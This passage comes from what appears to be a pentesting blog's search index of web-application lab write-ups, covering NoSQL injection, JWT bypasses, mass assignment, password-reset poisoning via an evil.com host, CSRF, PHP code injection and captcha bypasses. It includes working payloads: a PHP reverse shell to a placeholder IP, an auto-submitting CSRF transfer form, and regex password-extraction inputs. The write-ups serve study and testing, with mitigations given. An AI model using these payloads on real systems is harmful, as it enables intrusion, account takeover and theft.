therefore, if we can supply this payload user=admin&amp;amp;pass[$regex]=^.{[length]}$, we will be able to determine the length of the password.We will start with number 1 and then increment it until we get the length. Our input will now be user=admin&amp;amp;pass[$regex]=^.{1}$.We were redirected to error page, which means the password length is greater than 1. We will proceed by incrementing the number until we find the right one.We have been redirected to profile page, which means 8 was the correct length.Since we have the length of the password, we will proceed to extract the password itself. Our regex will be something like ^........$ with the number of dot . equals to the length of the password 8. Since . matches anything , this means ^........$ will match anything whose length is 8. If we replace the first dot with k which is ^k.......$, it means to match a string that starts with k and whose length is 8. In this way, we can extract the password of the user by changing the character until we get the right one, we will be doing thesame thing to all dot ..The easier way to do this is to forward our request to burp intruder and set our payload containing all the characters that can be used in a passwords.As you can see we were able to get the first character of the password. We will be repeating thesame to all until we get the password.We have finally got the password as admin123. We can now login as admin with admin123 as the password.Mitigations Use a sanitization library. For example, mongo-sanitize or mongoose. Use the least-privilege mode.References https://www.acunetix.com/blog/web-security-zone/nosql-injections/" }, { "title": "Multi-Factor Authentication Bypass", "url": "/posts/mfau/", "categories": "WebApp And Api Pentesting, Multi-Factor Authentication Bypass", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Multi-Factor Authentication BypassAt times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a “logged in” state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to “logged-in only” pages after completing the first authentication step. Occasionally, you will find that a website doesn’t actually check whether or not you completed the second step before loading the page.ExploitationThis lab’s two-factor authentication can be bypassed. We have already obtained a valid username and password carlos:montoya, but we do not have access to the user’s 2FA verification code. We are going to bypass the 2fa to access Carlos’s account page.Let’s login with his credentials carlos:montoya.As you can see we have been prompted to enter 4 digit code for 2fa. We will refresh the page and then intercept the request in burpsuite.We will change the url to the url of user’s profile my-account to see if we can bypass it.Nice!, We have logged in as carlosReferences https://portswigger.net/web-security/authentication/multi-factor" }, { "title": "Mass Assignment -&gt; Horizontal Privilege Escalation", "url": "/posts/massh/", "categories": "WebApp And Api Pentesting, Mass Assignment -> Horizontal Privilege Escalation", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Mass Assignment -&amp;gt; Horizontal Privilege EscalationSoftware frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm. Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended.ExploitationThis webaapp is vulnerable to mass assignment , which will allow attacker to access information that he doesn’t have permission.Since we have been given a credentials, we will login to see how the application is working.As you can see , we have access to company 1 information, but our goal here is to access company 2 information.To do that, we will login again and intercept the request in burpsuite.The application was submitting user[username]=user1&amp;amp;user[password]=pentesterlab. So If it’s vulnerable to mass assignment, and has company attribute, we can overwrite the company attribute by adding either user[company_id]=2 or user[company]=2 to our request.Let’s try this trick with this payload user[username]=user2&amp;amp;user[password]=user2&amp;amp;user[company]=2We got internal Server Error, which might be because of invalid attribute.We will try again with company_id. Our payload will be user[username]=user2&amp;amp;user[password]=user2&amp;amp;user[company_id]=2Done!.Mitigations Use Data Transfer Objects (DTOs).References https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" }, { "title": "Mass Assignment -&gt; Vertical Privilege Escalation", "url": "/posts/mass/", "categories": "WebApp And Api Pentesting, Mass Assignment -> Vertical Privilege Escalation", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Mass Assignment -&amp;gt; Vertical Privilege EscalationSoftware frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm. Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended.ExploitationThis webaapp is vulnerable to mass assignment which will allow attacker to register as admin.We will first register as normal user to see how the application is working.Let’s submit the registration formAs you can see , we have registered as normal user but our goal here is to register as admin.To do that, we will fill the registration form and intercept the request in burpsuite.The application was submitting user[username]=user2&amp;amp;user[password]=user2. So If it’s vulnerable to mass assignment, and has admin attribute, we can overwrite the admin attribute by adding either user[admin]=1 or user[admin]=true to our request.Let’s try this trick with this payload user[username]=user2&amp;amp;user[password]=user2&amp;amp;user[admin]=1Done!.Mitigations Use Data Transfer Objects (DTOs).References https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" }, { "title": "JWT Authentication Bypass -&gt; Weak Signing Key", "url": "/posts/jwtw/", "categories": "WebApp And Api Pentesting, JWT Authentication Bypass -> Weak Signing Key", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "JWT Authentication Bypass -&amp;gt; Weak Signing KeyJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. If the server uses weak secret key, attacker can easily guess or brute-force the secret key which will allow him to modify and sign the jwt token.ExploitationThis webapp uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets. We are going to brute-force the website’s secret key and use it to sign a modified session token that gives us access to the admin panel at /admin.We will login with the following credentials wiener:peter.We have logged in as wiener. We will refresh the page and intercept the request in burpsuite.We will copy the jwt session cookie and crack it with hashcat.hashcat -a 0 -m 16500 &amp;lt;YOUR-JWT&amp;gt; /path/to/jwt.secrets.listGreat!. We got the secret key secret1. We are going to generate jwt symmetric key using our secret key secret1 and then sign our modified token with our generated key.Now we have modified our jwt session token, we will try to access admin interface.Done!.References https://portswigger.net/web-security/jwt" }, { "title": "JWT Authentication Bypass -&gt; Unverified Signature", "url": "/posts/jwtu/", "categories": "WebApp And Api Pentesting, JWT Authentication Bypass -> Unverified Signature", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "JWT Authentication Bypass -&amp;gt; Unverified SignatureJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. If the server doesn’t verify the signature properly, there’s nothing to stop an attacker from making arbitrary changes to the rest of the token.ExploitationThis webapp uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn’t verify the signature of any JWTs that it receives. We are going to modify our session token to gain access to the admin panel at /admin.We will login with the following credentials wiener:peter.We have logged in as wiener. We will refresh the page and intercept the request in burpsuite.Let’s attempt to access admin interfaceAs you can see, we didn’t have permission to access admin interface. We need to login as administrator.We will decode the jwt token.Here, the value of sub was wiener, which was our username. Let’s change it to administrator.As you can see, we were able to login as administrator because the server didn’t verify the signature.References https://portswigger.net/web-security/jwt" }, { "title": "JWT Authentication Bypass -&gt; jku header injection", "url": "/posts/jwtjku/", "categories": "WebApp And Api Pentesting, JWT Authentication Bypass -> jku header injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "JWT Authentication Bypass -&amp;gt; jku header injectionJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. If the server is insecurely configured to accept unsigned jwts, attacker can modify jwt token to elevate his privileges. If the server supports the jku parameter in the JWT header but it fails to check whether the provided URL belongs to a trusted domain before fetching the key, then attacker can alter the jwt token to escalate his privileges.ExploitationThis webapp uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key. We are going to modify our session token to gain access to the admin panel at /admin.We will login with the following credentials wiener:peter.We have logged in as wiener. We will refresh the page and intercept the request in burpsuite.We will generate new rsa key and host the public key in our own server.We will then modify the value of jku to contain our domain on which we hosted the public key, modify the value of sub to administrator.Then sign the token with our generated rsa key and forward the request.We have accessed admin interface.References https://portswigger.net/web-security/jwt" }, { "title": "JWT Authentication Bypass -&gt; Algorithm Confusion", "url": "/posts/jwtc/", "categories": "WebApp And Api Pentesting, JWT Authentication Bypass -> Algorithm Confusion", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "JWT Authentication Bypass -&amp;gt; Algorithm ConfusionJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. If the server is insecurely configured to accept unsigned jwts, attacker can modify jwt token to elevate his privileges. Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website’s developers.ExploitationThis webapp uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. We will first obtain the server’s public key. This is exposed via a standard endpoint and use this key to sign a modified session token that gives us access to the admin panel at /admin.We will login with the following credentials wiener:peter.We have logged in as wiener. We will refresh the page and intercept the request in burpsuite then visit this endpoint /jwks.json to retrieve public key of the server, which would be used to generate our symmetric key.We will import jwk rsa key and retrieve the public key in .pem format, then encode the key in base64.Now we will generate our symmetric key using the rsa public key as secret key.Then modify and sign the token with the newly generated key, then forward the request to access admin interface.We have accessed admin interface.References https://portswigger.net/web-security/jwt" }, { "title": "JWT Authentication Bypass -&gt; None Algorithm", "url": "/posts/jwta/", "categories": "WebApp And Api Pentesting, JWT Authentication Bypass -> None Algorithm", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "JWT Authentication Bypass -&amp;gt; None AlgorithmJSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (“claims”) about users as part of authentication, session handling, and access control mechanisms. If the server is insecurely configured to accept unsigned jwts, attacker can modify jwt token to elevate his privileges.ExploitationThis webapp uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs. We are going to modify our session token to gain access to the admin panel at /admin.We will login with the following credentials wiener:peter.We have logged in as wiener. We will refresh the page and intercept the request in burpsuite..We will modify the value of alg to none, sub to Administrator and then delete the signature. alg is a header that tells the server which algorithm to use, in this case we use none which means no algorithm was used to sign the token and so no algorithm will be used to verify it, therefore, it tells the server to skip the verification of the token.We have accessed admin interface.References https://portswigger.net/web-security/jwt" }, { "title": "Insecure Deserialization", "url": "/posts/insecdes/", "categories": "WebApp And Api Pentesting, Insecure Deserialization", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Insecure DeserializationInsecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.IdentificationThis webapp uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. We are going to manipulate the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.We will login with the following credentials: wiener:peter and then escalate to admin privileges.Now we have logged in as wiener.To examine the cookie, we will refresh the page and then intercept the request in burp suite.As you can see from the format of the decoded cookie, it was using serialiazed object as cookie.ExploitationThere was admin object with attribute 0 which might define the privileges of a user. Therefore, if it’s vulnerable to Insecure Deserialization, we can modify the attribute of admin to 1, which will allow us to login as admin.Nice!, Admin Panel has appeared, meaning we have admin privileges.References https://portswigger.net/web-security/deserialization https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" }, { "title": "Html Injection", "url": "/posts/htmli/", "categories": "WebApp And Api Pentesting, Html Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Html InjectionHTML Injection is an attack that is similar to Cross-site Scripting (XSS). While in the XSS vulnerability the attacker can inject and execute Javascript code, the HTML injection attack only allows the injection of certain HTML tags. When an application does not properly handle user supplied data, an attacker can supply valid HTML code, typically via a parameter value, and inject their own content into the page.ExploitationThe webapp takes in user’s firstname and lastname and then displays a welcoming message.Let’s supply our firstname and lastname as firstname: html, lastname: exploit .We got a text saying welcome html exploit. Since it was reflecting our input back, it might be vulnerable to html injection if it does’nt sanitize user’s inputs. We can further inspect the page.We will inject html button in the firstname field and html link in the lastname field and see whether they will be displayed on the page. Our inputs will be something like &amp;lt;button&amp;gt;Click&amp;lt;/button&amp;gt; for the firstname field and &amp;lt;a href=#&amp;gt;Here&amp;lt;/a&amp;gt; for the lastname field.As you can see, the button and link appeared on the page.Mitigations Filter metacharacters from user input.References https://www.acunetix.com/vulnerabilities/web/html-injection/" }, { "title": "Host Header Injection -&gt; Password Reset Poisoning", "url": "/posts/hheadp/", "categories": "WebApp And Api Pentesting, Host Header Injection -> Password Reset Poisoning", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Host Header Injection -&amp;gt; Password Reset PoisoningPassword reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users’ passwords and, ultimately, compromise their accounts.A typical password reset poisoning attack.ExploitationThis webapp is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. We are going to leverage password reset poisoning to steal password reset token and takeover carlos account.To understand the application’s logic,We will login with the following credentials: wiener:peter and examine the webapp.Here we have logged in as wiener. Let’s logout and test for a forgot password functionality.As you can see , we were prompted to enter a username. We will go with wiener first.Reset password link has been sent to wiener email. Let’s check the email and see.We have received an email containing a link to reset password. Notice that the URL contains the query parameter temp-forgot-password-token.We will click on the link.Here, we have given the option to enter a new password which if successful will reset the password of the user. Now we will repeat thesame process with our target user carlos.Since we have the victim username carlos, we will submit a password reset request on his behalf and intercept the resulting HTTP request and modify the Host header so that it points to a domain that we control.We will replace the host header with our domain. The trick here is that, Host header is being used to generate a password reset link which is sent to a user’s email, therefore, by replacing the host header with our own domain, we will make the webapp to generate the password reset link using our own domain and then send it to the user, which if he clicks will make an http request to our server. For example, if the host header is example.com, password reset link will be generated like this http://example.com/temp-forgot-password-token=vsaahhdavvccavd. However, if the host header is replaced with evil.com, it will use evil.com to generate the password reset link like http://evil.com/temp-forgot-password-token=babhabdha and send it to the victim. If the victim clicks http://evil.com/temp-forgot-password-token=babhabdha, we will receive his token as he will make a request to our own server.Let’s forward the requestThe victim carlos will receive a genuine password reset email directly from the website. This seems to contain an ordinary link to reset his password and, crucially, contains a valid password reset token that is associated with his account. However, the domain name in the URL points to our own domain.If the victim carlos clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to our server.We will check our server’s logs to see if there is a request containing password reset token.Got it!!We can now visit the real URL for the vulnerable website and supply the victim’s carlos stolen token via the corresponding parameter. We will then be able to reset the victim’s carlos password to whatever we like and subsequently log in to his account.We will reset the password and login to carlos account.Done!.References https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" }, { "title": "Host Header Injection -&gt; Authentication Bypass", "url": "/posts/hheada/", "categories": "WebApp And Api Pentesting, Host Header Injection -> Authentication Bypass", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Host Header Injection -&amp;gt; Authentication BypassHost header injection exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. This could lead to authentication bypass.ExploitationThis webapp is vulnerable to Host Header Injection that will allow us to access an internal admin interface.We will refresh the page and intercept the request in burpsuite.Here we are going to replace the host header with localhost to see if we can access an internal server.As you can see we have accessed the admin interface of the internal server.References https://portswigger.net/web-security/host-header" }, { "title": "Directory Bruteforce", "url": "/posts/dirb/", "categories": "WebApp And Api Pentesting, Directory Bruteforce", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Directory BruteforceExploitation" }, { "title": "Cross-Side Request Forgery", "url": "/posts/csrf/", "categories": "WebApp And Api Pentesting, Cross-Side Request Forgery", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Cross-Side Request Forgery (csrf)Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing.ExploitationThis webapp is vulnerable to csrf which allows attacker to trick user into transfering money to attacker’s choosing account.we will first transfer 10 EUR to 123-45678-90 to see how the webapp is working.Done. You can see we have been charged 10 EUR and our balance was 980 EUR.Let’s repeat again with 100 EUR and intercept the request in burp. We will use the intercepted request to create an csrf payload.By examing the request, our payload will be something like&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&quot;http://192.168.43.14/bWAPP/csrf_2.php&quot; method=&quot;GET&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;173-46078-907&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;100&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;transfer&quot;/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.forms[0].submit(); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;We will host the payload in our server and make the user visit our site.As you can see,the user was charged 100 making his balance 880 EUR.References https://owasp.org/www-community/attacks/csrf" }, { "title": "Cross-Origin Resource Sharing", "url": "/posts/cors/", "categories": "WebApp And Api Pentesting, Cross-Origin Resource Sharing", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Cross-Origin Resource SharingCross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website’s CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).ExploitationReferences https://portswigger.net/web-security/cors" }, { "title": "Code Injection", "url": "/posts/codei/", "categories": "WebApp And Api Pentesting, Code Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Code InjectionCode Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. Code Injection differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, they are only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell.DetectionThe webapp seems to take in user supplied input and reflect it on the page. if we replace test with any text we want, we will have our text displayed on the page. Let’s replace it with exploit.We got exploit displayed on the page.Let’s conduct a fuzzing on the parameter to see if we can break something and get an error, or if we can determine some anomality from the response. There are lot of characters that can be used such as ; , || &#39; @ / &amp;gt; &amp;lt; $.... We will start with ;.We are going to supply exploit; and see if we can get something interestingWell, it reflected the text without ;, it supposed to display exploit; not exploit on the page, so there must be something behind.Let’s change the input to be like this ;exploit and see againAs you can see nothing was displayed, which was supposed to display ;exploit on the page. This means our input broke something in the backend, this webapp might be vulnerable to either code injection or command injection because ; character is mostly used in shell or in code that is needed to evaluate string as a code.Let’s test for code injection. Since this is php, we will make use of phpinfo() function to test for code injection, which if successfull will display plenty information about php and the server itself. We will supply exploit;phpinfo();We got it. This means the webapp is vulnerable to code injection.ExploitationEcho’ying textLet’s see if we can execute php code by supplying this exploit;echo &#39;yes&#39;;It’s been executed, you can see yes has been displayed on the page.System Commandphp has system function that will allow us to execute shell command in the backend. Let’s supply exploit;system(&#39;id&#39;);Well, id was executed.Reverse ShellTo get a reverse shell, we will intercept the request in burp suite, setup our listerner, supply our payload and then forward it to the server.our payload here$sock=fsockopen(&quot;[ip]&quot;,[port]);$proc=proc_open(&quot;/bin/bash&quot;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock),$pipes);We got reverse shell.Mitigations Avoid using unsafe functions in source code. Utilize Whitelisting for input validation. Escaping All User Supplied Input.References https://owasp.org/www-community/attacks/Code_Injection" }, { "title": "Clickjacking", "url": "/posts/clickjack/", "categories": "WebApp And Api Pentesting, Clickjacking", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "ClickjackingClickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy websiteExploitationClickjacking attacks are possible whenever websites can be framed. We can determine whether or not a website can be framed from its response header.Website can be framed If neither X-Frame-Options nor Content-Security-Policy header is used.We will examine the response header.As you can see, there was neither X-Frame-Options nor Content-Security-Policy in the response header, which means the site can be framed and so it’s vulnerable to clickjacking.References https://portswigger.net/web-security/clickjacking" }, { "title": "Captcha Bypass -&gt; Missing Parameter", "url": "/posts/capv/", "categories": "WebApp And Api Pentesting, Captcha Bypass -> Missing Parameter", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Captcha Bypass -&amp;gt; Missing ParameterCAPTCHA Is a type of challenge–response test used in computing to determine whether the user is human or a bot. Sometimes, web application fails to validate captcha if captcha parameter or value is not provided.ExploitationWe will enter a wrong answer and intercept the request in burp.Let’s remove the value of captcha and see what will happenWe got redirection to the capcha page, which means Our trick didn’t work.Let’s try to remove the capcha parameter catcha= to see if we can bypass it.Nice!, We have bypassed the captcha.References https://en.wikipedia.org/wiki/CAPTCHA" }, { "title": "Captcha Bypass -&gt; Leaked In HTML", "url": "/posts/capg/", "categories": "WebApp And Api Pentesting, Captcha Bypass -> Leaked In HTML", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Captcha Bypass -&amp;gt; Leaked In HTMLCAPTCHA Is a type of challenge–response test used in computing to determine whether the user is human or a bot. Misconfigured captcha may leak the answer of the captcha in html source code.ExploitationLet’s inspect the html to see whether the answer is leakedAs you can see, the answer was leaked in hidden html element.References https://en.wikipedia.org/wiki/CAPTCHA" }, { "title": "Captcha Bypass -&gt; Not Expiring After Used", "url": "/posts/cape/", "categories": "WebApp And Api Pentesting, Captcha Bypass -> Not Expiring After Used", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Captcha Bypass -&amp;gt; Not Expiring After UsedCAPTCHA Is a type of challenge–response test used in computing to determine whether the user is human or a bot. Solved captcha is meant to be used once, so if the captcha is misconfigured, we can be able to reuse it several times.ExploitationLet’s enter the answer and intercept the request in burpsuite.We will forward the request and send copy of it to burp repeater so that we can reuse it.Now we have used the captcha to access this page.We will go back to burp repeater and try to reuse the captcha. Captcha is meant to be used once, so if the captcha is misconfigured, we can be able to reuse the captcha several times.As you can see , we were able to reuse the captcha.We can use null payload in burp intruder to send any number of request we want with the solved captcha.References https://en.wikipedia.org/wiki/CAPTCHA" }, { "title": "Captcha Bypass -&gt; Leaked In Cookie", "url": "/posts/capc/", "categories": "WebApp And Api Pentesting, Captcha Bypass -> Leaked In Cookie", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Captcha Bypass -&amp;gt; Leaked In CookieCAPTCHA Is a type of challenge–response test used in computing to determine whether the user is human or a bot. Misconfigured captcha may leak the answer of the captcha in user’s cookie.ExploitationLet’s examine the cookie and see whether the answer is leakedAs you can see, the answer was leaked in the cooke.References https://en.wikipedia.org/wiki/CAPTCHA" }, { "title": "Captcha Bypass -&gt; OCR", "url": "/posts/capai/", "categories": "WebApp And Api Pentesting, Captcha Bypass -> OCR", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Captcha Bypass -&amp;gt; OCRCAPTCHA Is a type of challenge–response test used in computing to determine whether the user is human or a bot. If the text in the captcha is not scattered enough, we can use ocr (Optical Character Recognition) tool to recognise it.ExploitationAs you can see the text in the image is not scattered enough making it possible for ocr tool to recognise the text.This is the python script that we are going to use to recognise the text of the captcha.# We import the necessary packages#import the needed packagesimport cv2import os,argparseimport pytesseractfrom PIL import Image#We then Construct an Argument Parserap=argparse.ArgumentParser()ap.add_argument(&quot;-i&quot;,&quot;--image&quot;, required=True, help=&quot;Path to the image folder&quot;)ap.add_argument(&quot;-p&quot;,&quot;--pre_processor&quot;, default=&quot;thresh&quot;, help=&quot;the preprocessor usage&quot;)args=vars(ap.parse_args())#We then read the image with textimages=cv2.imread(args[&quot;image&quot;])#convert to grayscale imagegray=cv2.cvtColor(images, cv2.COLOR_BGR2GRAY)#checking whether thresh or blurif args[&quot;pre_processor&quot;]==&quot;thresh&quot;: cv2.threshold(gray, 0,255,cv2.THRESH_BINARY| cv2.THRESH_OTSU)[1]if args[&quot;pre_processor&quot;]==&quot;blur&quot;: cv2.medianBlur(gray, 3) #memory usage with image i.e. adding image to memoryfilename = &quot;{}.jpg&quot;.format(os.getpid())cv2.imwrite(filename, gray)text = pytesseract.image_to_string(Image.open(filename))os.remove(filename)print(text)Let’s download the image and use our python script to recognise the textit was able to recognised the text as edward, which was correct.Let’s test one more.it was able to recognised the text as genesis, which was correct.References https://en.wikipedia.org/wiki/CAPTCHA" }, { "title": "Broken Authentication -&gt; Weak Password", "url": "/posts/bsw/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Weak Password", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication -&amp;gt; Weak PasswordA weak password is short, common, a system default, or something that could be rapidly guessed by executing a brute force attack using a subset of all possible passwords.ExploitationIn this case,we will try to login as admin with this credential admin:admin.Let’s click on login and see if we can login as admin.Great!, We were able to guess admin credential.Mitigations Enforce Passwords Policy.References https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" }, { "title": "Session hijacking -&gt; Session Id In Url", "url": "/posts/bsur/", "categories": "WebApp And Api Pentesting, Session hijacking -> Session Id In Url", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Session hijacking -&amp;gt; Session Id In UrlIf you place a session token directly in the URL, it increases the risk of an attacker capturing and exploiting it. Anyone who follows that URL inherits the session. Therefore, session id should never be exposed in url.As you can see, session id of a user was exposed in url.References https://www.acunetix.com/blog/web-security-zone/session-token-in-url-vulnerability/" }, { "title": "Broken Authentication -&gt; Username Enumeration", "url": "/posts/bsu/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Username Enumeration", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication -&amp;gt; Username EnumerationUsername enumeration is a technique of guessing a valid usernames on a server or web application.ExploitationIn this test, we are going to use two usernames with invalid passwords, one is already registered username admin and the other is unregistered username anything. We will try to distinguish registered username from unregistered by examining the error message.Let’s test for registered user admin with invalid passwordWe got an error message saying password incorrect, this looks like the username is correct. But let’s test for the unregistered username to see if we can get different error message. We will enter exploit as the username.As you can see, this time we got different error message saying account does not exist. This differences in the error messages will allow attacker to distinguish registered usernames from the others.References https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account" }, { "title": "Session hijacking -&gt; Session Fixation", "url": "/posts/bss/", "categories": "WebApp And Api Pentesting, Session hijacking -> Session Fixation", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Session hijacking -&amp;gt; Session FixationSession Fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the vulnerable web application. When authenticating a user, it doesn’t assign a new session ID, making it possible to use an existent session ID.Exploitation The attacker accesses the web application login page and receives a session identifier generated by the web application. This step is not necessary if the web application accepts arbitrary session IDs. The attacker uses an additional technique such as CRLF Injection, man-in-the-middle attack, social engineering, etc., and gets the victim to use the provided session identifier. This depends on how the web application handles session IDs. It may be as simple as sending a malicious URL but may also require the attacker to create a fake website. The victim accesses the web application login page and logs in to the application. After authenticating, the web application treats anyone who uses this session ID as if they were this user. The attacker uses the session identifier to access the web application, take over the user session, and impersonate the victim. Further actions depend on the attacker and web application functionality. Note: No Lab For DemonstrationMitigations Change the session ID right after the user logs in. Invalidate session IDs after a timeout.References https://owasp.org/www-community/attacks/Session_fixation https://www.acunetix.com/blog/web-security-zone/what-is-session-fixation/" }, { "title": "Broken Authentication -&gt; Account Takeover Via Multistage Login", "url": "/posts/bsm/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Account Takeover Via Multistage Login", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication -&amp;gt; Account Takeover Via Multistage LoginExploitationThis webapp has authentication flaw that allows attacker to takeover an account of any registered user. We have been provided with the credential of Joe but our goal is to login as Jane.Let’s enter the credentials Joe:banana, click on submit and then intercept the request in burpsuite.Nothing interesting here, let’s forward the request.Here we have been asked to enter the value of Tan #2 which was 4894. Let’s submit and intercept the request in burpsuite.Well, hidden_user looks interesting target to us, we will replace Joe with Jane and see if we can login to Jane account.Let’s forward the requestGreat!, We have takenover jane account.References" }, { "title": "Session hijacking -&gt; Insufficient Session Expiration", "url": "/posts/bsl/", "categories": "WebApp And Api Pentesting, Session hijacking -> Insufficient Session Expiration", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Session hijacking -&amp;gt; Insufficient Session ExpirationInsufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.ExploitationThis webapp permits a user to reuse his session id after logout, it supposed to invalidate session id of a user when he logs out from his account.Let’s logout from the account by clicking on this link here.Now we have logged out from the account. To reuse our old session id, we will click on back &amp;lt;- in the browser to go back to our previous page and then refresh the page to determine whether or not we are still logged in.As you can see we were able to login after we logged out from the account, This means it was’nt invalidating the session after logout.References https://cwe.mitre.org/data/definitions/613.html https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" }, { "title": "Broken Authentication -&gt; Unencrypted Communication", "url": "/posts/bsi/", "categories": "WebApp And Api Pentesting, Broken Authentication -> Unencrypted Communication", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Broken Authentication -&amp;gt; Unencrypted CommunicationIf application allows users to connect to it over unencrypted connections(http). An attacker suitably positioned to view a legitimate user’s network traffic could record and monitor their interactions with the application and obtain any information the user supplies.ExploitationIn this case,we will try to login as admin with this credential admin:admin, and then sniff the http traffics with wireshark.Let’s check our wireshark and examine the http trafficsAs you can see, we were able to retrieve user’s 